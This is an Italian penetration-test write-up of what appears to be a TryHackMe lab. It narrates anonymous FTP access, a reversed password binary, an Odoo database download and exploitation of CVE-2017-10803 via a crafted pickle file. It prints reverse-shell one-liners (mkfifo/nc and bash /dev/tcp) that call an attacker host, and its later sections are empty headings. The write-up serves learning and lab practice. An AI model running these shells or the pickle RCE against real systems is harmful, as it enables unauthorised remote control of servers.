## Indice

Executive Summary - Qual'è l'obiettivo del mio lavoro
	Summary of Results - Riassiunto dei risultati trovati e delle vuln trovate

Attack Narrative
	Remote System Discovery
	Anonymous FTP Login
	Active Scanning and Files Disclosure
	Login as Admin
	Reverse Shell as odoo User
	Privilege Escalation to root
	Lateral Movement
	Privilege Escalation on second machine

Conclusion
	Recommendations (Some Fixes) - Quali fix e patch si possono attuare

-----
# Progetto VAPT

bla bla

-----

## Executive Summary

L'obiettivo di questa attività di VAPT è di trovare ed exploitare tutte le vulnerabilità presenti sulla macchina target (o anche su altre) e prenderne il controllo in modo da ottenere le 3 flag richieste dalla Room di TryHackMe. 
Tale Room non fornisce alcun indizio o hint, tale approccio rispecchia quindi una reale situazione di Vulnerability Assesment e Penetration Testing su un target. Ho utilizzato una macchina connessa alla VPN di TryHackMe in modo da trovarmi sulla stessa VLAN della macchina target.
Quanto segue nel report è un dettagliato walkthrough passo dopo passo di quello che ho fatto per trovare e abusare le vulnerabilità, compresi tentativi trial and error che non hanno portato a molto ma che fanno comunque parte dell'attività.

### Summary of Results

La Discovery iniziale ha portato alla luce un servizio FTP in cui è possibile effettuare un login tramite utente Anonimo, quindi senza password. Tale accesso rivela un eseguibile usato per cambiare password che una volta analizzato rivela l'employee id che mi ha permesso di ottenere la password di un utente admin sul sito web hostato. Quest'ultimo utilizza una versione Odoo vulnerabile a Remote Code Execution (CVE-2017-10803). Exploitare questa vulnerabilità mi ha permesso di ottenere una reverse shell sulla macchina e trovare così la prima flag. Una volta dentro ho exploitato un eseguibile SUID vulnerabile a ret2win per ottenere privilegi di root. Questo mi ha permesso poi di fare movimento laterale verso una seconda macchina (locale a quella exploitata) e trovare la seconda flag della Room tramite exploitation dello stesso eseguibile, che la macchina espone su una porta. Su questa macchina ho anche trovato delle chiavi ssh private e pubbliche che mi hanno permesso un più rapido accesso a tale macchina e mi sono state molto utili per sfruttare la vulnerabilità successiva. Infatti oltre alle chiavi era presente un eseguibile SUID vulnerabile a ret2libc, che una volta exploitato mi ha garantito accesso come root sulla seconda macchina e la terza ed ultima flag.

-----

## Attack Narrative


### Remote System Discovery

Una volta attivata la VPN e attivata la macchina target ho subito fatto uno scan via nmap dell'indirizzo della macchina target fornitomi da TryHackMe. 

![[Pasted image 20250618190220.png]]

Le porte 21 e 22 sembrano protette da login tramite password mentre la porta 80 hosta una server web basato su Odoo. 
![[Pasted image 20250618192404.png]]

Collegandomi a quest'ultimo servizio da browser vengo reindirizzato ad una pagina di login, quindi anche questo servizio è protetto tramite autenticazione.


### Anonymous FTP Login & Files Disclosure

Per prima cosa mi sono concentrato sulla porta 21. Ho provato a collegarmi e dopo alcuni tentativi sono riuscito a effettuare il login tramite utente Anonimo, il quale non richiede password.

![[Pasted image 20250618190449.png]]

Dopo una rapida analisi ho trovato due files - notice.txt e password - che ho trasferito sulla mia macchina.

![[Pasted image 20250618190643.png]]

Il file di testo contiene il seguente:

```
From antisoft.thm security,


A number of people have been forgetting their passwords so we've made a temporary password application.
```

mentre password è un eseguibile non-stripped.


### Login as Admin

Dopo una esecuzione del programma ho capito che si tratta dell'applicazione citata nel file di testo e quindi permette di cambiare password fornito un certo employee id.
Ho quindi analizzato l'ELF tramite Ghidra e ho appurato che l'eseguibile presenta solo due funzioni: main e pass.

![[Pasted image 20250618191501.png]]

Il main chiama semplicemente la funzione pass, che è quella più interessante.

![[Pasted image 20250618191728.png]]

La funzione pass verifica che la stringa passata (che io ho rinominato a employee_id) sia uguale ad un valora hard-coded ed in chiaro, che una volta dato come input al programma mi ha permesso di ottenere una password.

![[Pasted image 20250618191953.png]]

Tornando alla schermata del sito web sulla porta 80 e cliccando su "Manage Database" si viene reindirizzati su una pagina differente

![[Pasted image 20250618193530.png]]

Da qui è possibile scaricare una copia del database se si conosce la "Master Password". Ho provato quella trovata tramite il programma password e sono riuscito a scaricare un backup del database che consiste in 3 files:
![[Pasted image 20250618193706.png]]

Analizzando `manifest.json` ho trovato che la versione di Odoo è la 10.0
![[Pasted image 20250618193815.png]]
e dopo una rapida ricerca sul web ho trovato che tale versione presenta una nota vulnerabilità, la CVE-2017-10803.
![[Pasted image 20250618193923.png]]

Tale vulnerabilità risiede in un modulo di Odoo che si occupa di anonimizzare il database. Tale modulo, se presente, utilizza una libreria python chiamata Pickle. Ipotizziamo che un admin del database lo anonimizzi tramite il modulo di Odoo; quello che succede è il seguente:
- Il modulo al suo interno fa utilizzo di una funzione della libreria python Pickle che prende in input un oggetto qualsiasi e lo converte in un file pickle serializzato (tale oggetto può essere una rappresentazione del database)
- Una volta creato il backup il database viene anonimizzato.
- Al contrario, se l'admin vuole de-anonimizzare un database ha bisogno del file .pickle per deserializzarlo.

La funzione `pickle.load()` che si occupa di leggere il file .pickle e convertirlo in un oggetto in memoria è vulnerabile ad Arbitrary Code Execution. Questo avviene perchè se l'oggetto che è stato serializzato aveva ad esempio un costruttore, allora tale costruttore viene eseguito quando il file viene deserializzato, perchè la funzione load() non fa altro che eseguire le istruzioni che permettono il caricamento dell'oggetto in memoria nello stesso stato in cui era quando è stato serializzato, e per fare ciò deve crearne uno nuovo tramite il costruttore e quindi eseguire codice presente nel file .pickle.

Arrivato a questo punto però mi serviva un modo per bypassare il login della schermata Odoo. Per avere piu informazioni sul modulo Odoo vulnerabile e potere anonimizzare il database ho infatti bisogno di accedere al pannello di controllo, probabilmente protetto proprio da questo login.

Cercando dentro il file dump.sql trovato in precedenza e cercando la stringa "admin" ho trovato quello che sembra essere un indirizzo email di amminstratore:
![[image_2025-06-12_20-19-18.png]]

Inserendolo come nome utente assieme alla stessa password utilizzata in precedenza sono riuscito ad effettuare il login all'interno del pannello di controllo.

### Reverse Shell as odoo User

![[Pasted image 20250618201340.png]]

Ho quindi installato il modulo vulnerabile e dopo aver anonimizzato il database e aggiornato la pagina, faccio l'operazione inversa - ovvero la de-anonimizzazione - fornendo un file .pickle da me creato.

![[Pasted image 20250618201535.png]]

Per creare il file .pickle ho modificato un payload trovato online che crea un file .pickle che se deserializzato esegue una o più istruzioni arbitrarie.

Dopo aver provato vari comandi senza successo, ho creato un server PHP nella mia macchina in modo da poter verificare che il comando venga effettivamente eseguito dal server.

![[Pasted image 20250618202344.png]]
![[Pasted image 20250618202352.png]]

Una volta uploadato il file .pickle generato dallo script in figura sono riuscito ad ottenere un riscontro che il comando è stato eseguito con successo. 
Sono allora passato a cercare payload che creino una reverse shell sul server, e dopo ancora altri tentativi ho trovato un payload che funziona, anche se sembra complicato da capire a primo impatto:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.3.9 9999 > /tmp/f
```
fonte: https://www.invicti.com/learn/reverse-shell

Il funzionamento del payload è il seguente:
- `rm /tmp/f`: rimuove il file /tmp/f se gia presente
- `mkfifo /tmp/f`: crea un file FIFO /tmp/f
- `cat /tmp/f|sh -i 2>&1|nc 10.9.3.9 9999 > /tmp/f`: reindirizza tutto ciò che viene scritto sul file FIFO ad una shell che a sua volta reindirizza il suo output come input per netcat connesso alla macchina dell'attaccante, l'output di netcat viene poi reindirizzato alla file  FIFO.

Questa serie di comandi permette di creare una reverse shell tramite netcat, con il file FIFO che fa da tramite di input/output tra la shell e netcat. La FIFO funge quindi da reindirizzatore che collega la shell spawnata alla connessione netcat ovvero all'attaccante.
I payload piu semplici che ho provato precedentemente (come `bash -i >& /dev/tcp/10.9.3.9/9999 0>&1`) non funzionavano perchè il server utilizza sh come shell e non bash.

![[Pasted image 20250618204004.png]]
![[Pasted image 20250618204010.png]]

Dopo aver uploadato e utilizzato il file .pickle contenente il payload per effettuare la de-anonimizzazione del database sul server ottengo una shell come utente odoo, e ottengo così la mia prima flag.



### Privilege Escalation to root

### Lateral Movement

### Privilege Escalation on Second Machine


----
## Conclusion

### Recommendations